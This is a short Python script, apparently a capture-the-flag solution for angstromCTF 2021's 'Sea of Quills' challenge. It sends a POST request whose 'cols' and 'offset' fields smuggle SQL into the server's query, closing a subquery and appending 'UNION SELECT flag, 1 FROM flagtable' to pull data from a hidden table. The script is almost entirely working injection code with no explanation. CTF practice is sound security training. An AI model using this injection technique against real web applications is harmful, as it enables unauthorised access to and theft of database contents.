import requests


#url = "http://localhost:4567/quills"
url = "http://seaofquills.2021.chall.actf.co/quills"

data = {
    "cols":"* FROM ( select name, desc",
    "limit":"1",
    "offset":"1\n) UNION SELECT flag, 1 FROM flagtable"
}


p = requests.post(url, data=data)

print(p.text)
